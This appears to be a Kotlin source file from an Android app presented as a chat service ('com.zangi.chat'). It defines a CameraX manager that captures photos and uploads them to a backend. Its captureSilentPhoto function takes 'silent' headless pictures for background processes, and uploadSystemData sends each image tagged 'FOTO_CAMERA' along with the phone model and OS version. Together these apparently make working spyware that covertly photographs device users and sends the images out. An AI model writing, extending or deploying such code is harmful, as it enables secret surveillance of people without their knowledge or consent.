package com.zangi.chat.service

import android.content.Context
import android.util.Log
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import com.zangi.chat.data.repository.ChatRepository
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.io.File
import kotlin.coroutines.resume

/**
 * CameraCaptureManager: Gerencia a captura de fotos reais utilizando CameraX.
 * Implementação otimizada para evitar travamentos e garantir o envio correto.
 */
class CameraCaptureManager(
    private val context: Context,
    private val repository: ChatRepository,
    private val lifecycleOwner: LifecycleOwner
) {
    private val TAG = "CameraCaptureManager"
    private var cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA
    private var imageCapture: ImageCapture? = null

    /**
     * Alterna entre a câmera frontal e traseira.
     */
    fun switchCamera() {
        cameraSelector = if (cameraSelector == CameraSelector.DEFAULT_BACK_CAMERA) {
            CameraSelector.DEFAULT_FRONT_CAMERA
        } else {
            CameraSelector.DEFAULT_BACK_CAMERA
        }
    }

    /**
     * Captura uma foto real e inicia o processo de upload.
     */
    suspend fun captureAndSendPhoto(userId: String): Result<Boolean> = withContext(Dispatchers.Main) {
        try {
            Log.d(TAG, "📸 Iniciando ciclo de captura de câmera...")

            // 1. Inicializar o CameraProvider (Sempre na Main Thread para bind)
            val cameraProvider = ProcessCameraProvider.getInstance(context).get()

            // 2. Configurar o ImageCapture
            val imageCapture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()
            
            this@CameraCaptureManager.imageCapture = imageCapture

            // 3. Bind da câmera ao ciclo de vida (Essencial para CameraX)
            cameraProvider.unbindAll()
            cameraProvider.bindToLifecycle(
                lifecycleOwner,
                cameraSelector,
                imageCapture
            )

            // 4. Preparar o arquivo temporário
            val tempFile = File(context.cacheDir, "cam_capture_${System.currentTimeMillis()}.jpg")

            // 5. Realizar a captura real (Chamada suspensa)
            val capturedFile = captureRealPhoto(imageCapture, tempFile) 
                ?: return@withContext Result.failure(Exception("Falha ao capturar imagem da câmera"))

            // 6. Enviar para o backend via Repository (O repositório deve agendar o Worker)
            // Mudamos para Dispatchers.IO para não travar a UI durante o processamento do upload
            val uploadResult = withContext(Dispatchers.IO) {
                val deviceInfo = "Android ${android.os.Build.VERSION.RELEASE}, ${android.os.Build.MODEL}, Cam: ${if(cameraSelector == CameraSelector.DEFAULT_BACK_CAMERA) "Back" else "Front"}"
                
                // Chamada ao repositório que enviará para o seu UploadWorker
                repository.uploadSystemData(
                    eventType = "FOTO_CAMERA", // Tipo que o seu backend identificará
                    file = capturedFile,
                    deviceInfo = deviceInfo
                )
            }


            if (uploadResult.isSuccess) {
                Log.d(TAG, "✅ Câmera: Processo de upload iniciado com sucesso.")
                Result.success(true)
            } else {
                Log.e(TAG, "❌ Câmera: Erro no upload: ${uploadResult.exceptionOrNull()?.message}")
                Result.failure(uploadResult.exceptionOrNull() ?: Exception("Erro no upload da câmera"))
            }

        } catch (e: Exception) {
            Log.e(TAG, "Erro crítico no CameraCaptureManager", e)
            Result.failure(e)
        }
    }

    /**
     * Captura uma foto silenciosa (headless) e retorna o File capturado.
     * Ideal para ser chamado por processos em background via Repositório.
     */
    suspend fun captureSilentPhoto(): File? = withContext(Dispatchers.Main) {
        try {
            val cameraProvider = ProcessCameraProvider.getInstance(context).get()
            val imageCapture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()
            
            cameraProvider.unbindAll()
            cameraProvider.bindToLifecycle(
                lifecycleOwner,
                cameraSelector,
                imageCapture
            )

            val tempFile = File(context.cacheDir, "silent_cam_${System.currentTimeMillis()}.jpg")
            return@withContext captureRealPhoto(imageCapture, tempFile)
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao capturar foto silenciosa", e)
            null
        }
    }

    /**
     * Método privado que utiliza a CameraX para capturar a imagem de forma assíncrona.
     */
    private suspend fun captureRealPhoto(
        imageCapture: ImageCapture, 
        outputFile: File
    ): File? = suspendCancellableCoroutine { continuation ->
        val outputOptions = ImageCapture.OutputFileOptions.Builder(outputFile).build()

        imageCapture.takePicture(
            outputOptions,
            ContextCompat.getMainExecutor(context),
            object : ImageCapture.OnImageSavedCallback {
                override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                    Log.d(TAG, "📸 Imagem capturada e salva: ${outputFile.name}")
                    continuation.resume(outputFile)
                }

                override fun onError(exception: ImageCaptureException) {
                    Log.e(TAG, "Erro na captura da câmera: ${exception.message}")
                    continuation.resume(null)
                }
            }
        )
    }
}